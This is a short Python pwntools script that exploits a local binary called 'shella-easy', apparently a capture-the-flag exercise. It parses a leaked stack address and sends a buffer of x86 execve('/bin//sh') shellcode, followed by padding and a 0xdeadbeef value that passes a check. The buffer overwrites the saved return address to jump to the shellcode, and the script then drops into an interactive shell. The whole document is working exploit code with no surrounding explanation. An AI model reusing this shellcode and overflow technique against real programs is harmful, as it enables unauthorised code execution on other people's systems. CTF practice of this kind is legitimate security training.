from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./shella-easy")
#gdb.attach(p, '''
#break *0x080484df
#break *0x0804853e
#''')

deadbeef = 0xdeadbeef
shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

leak = p.recvuntil("have a ")   # recover first part of string
shell_addr =  int(p.recv(10),16) # save base shellcode address
p.recvline()                    # recover rest of string

buf = shellcode
buf += "A" * (64 - 24)                  # Padding Overflow
buf += p32(deadbeef)            # TRUE for | cmp    DWORD PTR [ebp-0x8],0xdeadbeef |
buf += "B" * 8                  # Padding + 8
buf += p32(shell_addr)           # EIP Overwrite - Point to Shellcode -> Base "A" Padding

p.sendline(buf)
p.interactive()
